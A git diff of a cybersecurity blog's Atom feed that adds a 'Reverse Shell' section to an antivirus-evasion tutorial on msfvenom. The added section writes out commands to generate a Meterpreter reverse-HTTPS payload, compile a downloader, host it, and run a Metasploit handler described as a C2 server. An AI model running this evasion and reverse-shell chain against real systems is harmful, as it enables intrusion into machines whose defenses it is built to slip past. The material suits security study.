@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-30T22:53:03-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Msfvenom Is Not Dead</title><link href="/blog/AV-Evations" rel="alternate" type="text/html" title="Msfvenom Is Not Dead" /><published>2026-01-30T00:00:00-05:00</published><updated>2026-01-30T00:00:00-05:00</updated><id>http://localhost:4000/blog/AV-Ev</id><content type="html" xml:base="/blog/AV-Evations"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-31T14:02:04-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Msfvenom Is Not Dead</title><link href="/blog/AV-Evations" rel="alternate" type="text/html" title="Msfvenom Is Not Dead" /><published>2026-01-30T00:00:00-05:00</published><updated>2026-01-30T00:00:00-05:00</updated><id>http://localhost:4000/blog/AV-Ev</id><content type="html" xml:base="/blog/AV-Evations"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>
 
 <p>So I was thinking about a different way to keep using msfvenom these days, and I found one. Today, I’m going to show you that the tool isn’t the problem the delivery method is. By taking a ‘flagged’ raw payload and wrapping it in a custom C loader with simple XOR encryption, we can bypass static analysis and pop a calculator on a fully patched system.</p>
 
@@ -105,6 +105,88 @@ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
 </div>
 
 <p>This successfully performed a sandbox bypass.</p>
+
+<h1 id="reverse-shell">Reverse Shell</h1>
+
+<p>Now, let’s get to the real deal: getting a reverse shell, not just popping up a calculator. This time, we will not use encryption.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*vZGONyKEOQJlA_ApeQKuLw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h4 id="step-1-generate-the-staged-payload">Step 1: Generate the Staged Payload</h4>
+
+<p>Let’s generate the raw C code for a staged payload.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="Terminal">
+msfvenom -p windows/meterpreter_reverse_https LHOST=IP LPORT=8443 -f raw &gt; shellcode.bin
+
+</code></pre>
+  
+</div>
+
+<h4 id="step-2">Step 2:</h4>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="Terminal">
+i686-w64-mingw32-gcc https-downloader.c -o APT-Stage.exe -lwininet
+</code></pre>
+  
+</div>
+
+<h4 id="step-3-set-up-the-listener-the-c2-server">Step 3: Set up the Listener (The “C2 Server”)</h4>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="Terminal">
+sudo python3 -m http.server 80
+</code></pre>
+  
+</div>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="Terminal">
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST eth0; set LPORT 8443; run"
+</code></pre>
+  
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKwtpe4lUYhCAHGq9mzRZA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/v8enMs1Oexo" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
+  </iframe>
+</div>
 ]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>
 
 ]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Windows Forensics</title><link href="/blog/Windows-Forensics" rel="alternate" type="text/html" title="Windows Forensics" /><published>2026-01-26T00:00:00-05:00</published><updated>2026-01-26T00:00:00-05:00</updated><id>http://localhost:4000/blog/Windows-Forensics</id><content type="html" xml:base="/blog/Windows-Forensics"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>
